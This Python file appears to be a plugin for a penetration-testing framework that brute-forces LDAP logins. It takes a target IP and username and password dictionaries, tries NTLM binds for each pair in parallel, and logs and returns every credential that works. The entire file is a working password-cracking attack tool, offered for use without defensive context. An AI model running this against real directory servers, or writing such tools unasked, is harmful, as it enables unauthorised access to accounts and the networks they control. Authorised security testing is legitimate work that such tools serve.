# -*-* coding:UTF-8
import os
from ldap3 import Server, Connection, ALL


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ldap服务口令破解",
        "datetime": "2022-01-02"
    }

    @cli.options('ip', desc="设置爆破目标", default='{value}')
    @cli.options('port', desc="设置爆破端口", default=389)
    @cli.options('method', desc="设置口令爆破的模式,1:单点模式;2:交叉模式", default=1)
    @cli.options('username', desc="用户账号或字典文件", default=os.path.join('data', 'ldap_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'ldap_password.dict'))
    @cli.options('timeout', desc="设置连接超时时间", default=5)
    def ip(self, ip, port, method, username, password, timeout) -> dict:
        with self.async_pool(max_workers=self.config.general.asyncio, threshold=self.threshold) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, ip, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, ip, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        server = Server(
            host=ip,
            port=port,
            use_ssl=False,
            connect_timeout=timeout,
            get_info='ALL'
        )
        conn = Connection(
            server,
            user=username,
            password=password,
            check_names=True,
            lazy=False,
            auto_bind=True,
            receive_timeout=timeout,
            authentication="NTLM"
        )
        conn.unbind()
        server.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': port,
            'server': 'ldap',
            'username': username,
            'password': password
        }
